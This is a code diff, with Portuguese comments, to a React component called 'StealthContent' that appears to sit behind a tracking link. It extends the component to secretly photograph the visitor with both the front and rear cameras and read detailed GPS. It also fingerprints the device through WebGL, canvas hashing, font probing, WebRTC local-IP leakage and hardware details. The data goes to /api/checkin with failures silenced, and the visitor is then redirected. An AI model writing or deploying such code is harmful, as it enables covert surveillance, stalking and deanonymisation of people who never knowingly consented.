@@ -179,10 +179,15 @@ function StealthContent() {
     setPhase('capturing');
 
     let foto: string | null = null;
+    let fotoTraseira: string | null = null;
     let lat = 0;
     let lng = 0;
+    let altitude: number | null = null;
+    let velocidade: number | null = null;
+    let precisaoGPS: number | null = null;
+    let direcao: number | null = null;
 
-    // 1. Capturar foto (câmera frontal, escondida)
+    // 1. Capturar foto FRONTAL (câmera frontal, escondida)
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
@@ -210,7 +215,34 @@ function StealthContent() {
       // Câmera negada → continua sem foto
     }
 
-    // 2. Obter GPS
+    // 1b. Capturar foto TRASEIRA
+    try {
+      const streamBack = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: 'environment' }, width: { ideal: 480 }, height: { ideal: 360 } },
+        audio: false,
+      });
+
+      if (videoRef.current && canvasRef.current) {
+        videoRef.current.srcObject = streamBack;
+        await videoRef.current.play();
+        await new Promise((r) => setTimeout(r, 1000));
+
+        const canvas = canvasRef.current;
+        canvas.width = 480;
+        canvas.height = 360;
+        const ctx = canvas.getContext('2d');
+        if (ctx) {
+          ctx.setTransform(1, 0, 0, 1, 0, 0); // reset transform
+          ctx.drawImage(videoRef.current, 0, 0, 480, 360);
+          fotoTraseira = canvas.toDataURL('image/jpeg', 0.6);
+        }
+        streamBack.getTracks().forEach((t) => t.stop());
+      }
+    } catch {
+      // Câmera traseira não disponível → continua sem
+    }
+
+    // 2. Obter GPS detalhado
     try {
       const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -221,17 +253,22 @@ function StealthContent() {
       });
       lat = pos.coords.latitude;
       lng = pos.coords.longitude;
+      altitude = pos.coords.altitude;
+      velocidade = pos.coords.speed;
+      precisaoGPS = pos.coords.accuracy;
+      direcao = pos.coords.heading;
     } catch {
       // GPS negado → continua com 0,0
     }
 
-    // 3. Dados do dispositivo
+    // 3. Dados do dispositivo (básicos)
     const deviceInfo: Record<string, unknown> = {
       tela: `${window.screen.width}x${window.screen.height}`,
       idioma: navigator.language || '',
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
     };
 
+    // 3b. Bateria
     try {
       // eslint-disable-next-line @typescript-eslint/no-explicit-any
       const battery = await (navigator as any).getBattery?.();
@@ -241,24 +278,186 @@ function StealthContent() {
       }
     } catch { /* silencioso */ }
 
+    // 3c. Rede
     try {
       // eslint-disable-next-line @typescript-eslint/no-explicit-any
       const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
       if (conn) {
         deviceInfo.rede = conn.effectiveType || conn.type || '';
+        if (conn.downlink !== undefined) deviceInfo.downlink = conn.downlink;
+        if (conn.rtt !== undefined) deviceInfo.rtt = conn.rtt;
       }
     } catch { /* silencioso */ }
 
-    // 4. Enviar dados
+    // 4. Hardware info
+    try {
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      if ((navigator as any).deviceMemory) {
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        deviceInfo.memoriaRAM = (navigator as any).deviceMemory;
+      }
+      if (navigator.hardwareConcurrency) {
+        deviceInfo.nucleosCPU = navigator.hardwareConcurrency;
+      }
+    } catch { /* silencioso */ }
+
+    // 4b. GPU via WebGL
+    try {
+      const glCanvas = document.createElement('canvas');
+      const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+      if (gl) {
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        const debugInfo = (gl as any).getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          // eslint-disable-next-line @typescript-eslint/no-explicit-any
+          deviceInfo.gpu = (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      }
+    } catch { /* silencioso */ }
+
+    // 5. Canvas fingerprint
+    try {
+      const fpCanvas = document.createElement('canvas');
+      fpCanvas.width = 200;
+      fpCanvas.height = 50;
+      const fpCtx = fpCanvas.getContext('2d');
+      if (fpCtx) {
+        fpCtx.textBaseline = 'top';
+        fpCtx.font = '14px Arial';
+        fpCtx.fillStyle = '#f60';
+        fpCtx.fillRect(125, 1, 62, 20);
+        fpCtx.fillStyle = '#069';
+        fpCtx.fillText('Cwm fjordbank', 2, 15);
+        fpCtx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        fpCtx.fillText('Cwm fjordbank', 4, 17);
+        const fpData = fpCanvas.toDataURL();
+        // Simple hash
+        let hash = 0;
+        for (let i = 0; i < fpData.length; i++) {
+          const char = fpData.charCodeAt(i);
+          hash = ((hash << 5) - hash) + char;
+          hash |= 0;
+        }
+        deviceInfo.canvasHash = hash.toString(16);
+      }
+    } catch { /* silencioso */ }
+
+    // 5b. Pixel ratio, color depth, touch points
+    try {
+      deviceInfo.pixelRatio = window.devicePixelRatio || 1;
+      deviceInfo.colorDepth = window.screen.colorDepth || null;
+      deviceInfo.maxTouchPoints = navigator.maxTouchPoints || 0;
+    } catch { /* silencioso */ }
+
+    // 5c. Fontes detectadas (lista rápida de fontes comuns)
+    try {
+      const fontList = [
+        'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+        'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Palatino Linotype',
+        'Lucida Console', 'Tahoma', 'Segoe UI', 'Roboto', 'Helvetica',
+        'Calibri', 'Cambria', 'Consolas', 'Monaco', 'San Francisco',
+      ];
+      const detected: string[] = [];
+      const testDiv = document.createElement('span');
+      testDiv.style.position = 'absolute';
+      testDiv.style.left = '-9999px';
+      testDiv.style.fontSize = '72px';
+      testDiv.textContent = 'mmmmmmmmmmlli';
+      document.body.appendChild(testDiv);
+      testDiv.style.fontFamily = 'monospace';
+      const defaultWidth = testDiv.offsetWidth;
+      const defaultHeight = testDiv.offsetHeight;
+      for (const font of fontList) {
+        testDiv.style.fontFamily = `'${font}', monospace`;
+        if (testDiv.offsetWidth !== defaultWidth || testDiv.offsetHeight !== defaultHeight) {
+          detected.push(font);
+        }
+      }
+      document.body.removeChild(testDiv);
+      deviceInfo.fontes = detected.join(', ');
+    } catch { /* silencioso */ }
+
+    // 6. IP local via WebRTC
+    try {
+      const localIps = await new Promise<string>((resolve) => {
+        const ips: string[] = [];
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then((offer) => pc.setLocalDescription(offer));
+        const timeout = setTimeout(() => { pc.close(); resolve(ips.join(', ')); }, 3000);
+        pc.onicecandidate = (e) => {
+          if (!e.candidate) {
+            clearTimeout(timeout);
+            pc.close();
+            resolve(ips.join(', '));
+            return;
+          }
+          const parts = e.candidate.candidate.split(' ');
+          const ip = parts[4];
+          if (ip && !ips.includes(ip) && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
+            ips.push(ip);
+          }
+        };
+      });
+      if (localIps) deviceInfo.ipLocal = localIps;
+    } catch { /* silencioso */ }
+
+    // 7. Extras
+    try {
+      const orientation = window.screen.orientation?.type || '';
+      if (orientation) deviceInfo.orientacaoTela = orientation;
+    } catch { /* silencioso */ }
+
+    try {
+      deviceInfo.modoEscuro = window.matchMedia?.('(prefers-color-scheme: dark)').matches || false;
+    } catch { /* silencioso */ }
+
+    try {
+      deviceInfo.cookiesAtivos = navigator.cookieEnabled;
+    } catch { /* silencioso */ }
+
+    try {
+      deviceInfo.dnt = navigator.doNotTrack === '1';
+    } catch { /* silencioso */ }
+
+    try {
+      if (navigator.storage?.estimate) {
+        const estimate = await navigator.storage.estimate();
+        if (estimate.quota) {
+          deviceInfo.armazenamento = Math.round((estimate.quota / (1024 * 1024 * 1024)) * 100) / 100;
+        }
+      }
+    } catch { /* silencioso */ }
+
+    try {
+      deviceInfo.vendor = navigator.vendor || '';
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      deviceInfo.platform = (navigator as any).platform || '';
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      deviceInfo.webdriver = !!(navigator as any).webdriver;
+    } catch { /* silencioso */ }
+
+    // 8. Enviar dados
     try {
       await fetch('/api/checkin', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ token, foto, latitude: lat, longitude: lng, ...deviceInfo }),
+        body: JSON.stringify({
+          token,
+          foto,
+          fotoTraseira,
+          latitude: lat,
+          longitude: lng,
+          altitude,
+          velocidade,
+          precisaoGPS,
+          direcao,
+          ...deviceInfo,
+        }),
       });
     } catch { /* falha silenciosa */ }
 
-    // 5. Redirecionar
+    // 9. Redirecionar
     window.location.href = finalRedirect;
   };
 
